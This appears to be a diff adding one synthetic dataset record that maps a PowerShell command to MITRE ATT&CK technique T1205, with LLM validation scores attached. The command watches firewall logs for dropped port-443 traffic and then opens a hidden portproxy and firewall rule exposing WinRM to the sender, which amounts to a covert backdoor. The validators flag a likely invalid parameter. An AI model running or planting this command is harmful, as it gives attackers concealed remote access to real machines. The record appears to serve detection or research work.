@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ComputerName localhost -ScriptBlock { $log = \"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match 'DROP\\s+TCP\\s+(\\d{1,3}(?:\\.\\d{1,3}){3})\\s+\\d{1,3}(?:\\.\\d{1,3}){3}\\s+\\d+\\s+443\\b') { $src=$matches[1]; $name=\"iphttps-proxy-$($src.Replace('.','-'))\"; try { netsh interface portproxy add v4tov4 listenport=4443 listenaddress=0.0.0.0 connectport=5986 connectaddress=127.0.0.1 | Out-Null } catch {} if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4443 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 900; netsh interface portproxy delete v4tov4 listenport=4443 listenaddress=0.0.0.0 | Out-Null; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }",
+  "explanation": "Interprets inbound TCP/443 connection attempts (e.g., IP-HTTPS style) to closed port as a signal to expose a covert portproxy on 4443 to local WinRM HTTPS (5986) for the source IP.",
+  "rationale_steps": [
+    "Enable firewall dropped connection logging",
+    "Watch for inbound TCP/443 attempts",
+    "Create a scoped firewall rule and portproxy to reroute to local 5986",
+    "Clean up proxy and firewall rule after 15 minutes"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-419c2bb8-989079f9",
+  "source_prompt_hash": "419c2bb8",
+  "timestamp_utc": "2025-09-30T03:28:48.156174Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is well-formed and parseable with balanced blocks and correct piping, but it likely uses an invalid Set-NetFirewallProfile parameter (-LogDropped instead of -LogBlocked).",
+        "semantic_score": 4,
+        "semantic_justification": "It implements signaling by watching for dropped TCP/443 attempts and then creating a scoped, time-bound portproxy and firewall rule to 5986, aligning with T1205, but it requires administrative rights and local WinRM/remoting to be enabled so it may not function as-is.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T15:40:51.109882Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, braces, and uses valid PowerShell cmdlets, arguments, and command separators, making it parseable and runnable without syntax errors.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command's design perfectly aligns with the T1205 technique by using network traffic as a signal to trigger a covert channel, it requires Administrator privileges for core operations (e.g., Set-NetFirewallProfile, netsh, New-NetFirewallRule) despite the explanation claiming 'Privilege: None', rendering it operationally unfeasible as described.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T15:41:23.466540Z"
+      }
+    ],
+    "llm_average_syntactic": 4.5,
+    "llm_average_semantic": 3.5,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
